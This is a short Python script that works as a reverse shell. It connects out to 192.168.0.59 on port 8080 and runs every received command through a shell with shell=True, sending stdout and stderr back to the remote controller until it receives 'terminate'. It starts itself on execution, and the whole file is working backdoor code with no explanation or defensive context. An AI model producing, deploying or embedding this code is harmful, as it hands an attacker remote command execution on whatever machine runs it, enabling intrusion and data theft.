import socket
import subprocess


def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    IP='192.168.0.59'
    s.connect((IP,8080))

    while True:
        command=s.recv(1024)

        if 'terminate' in command:
            s.close()
            break

        else:
            CMD=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())



connect()
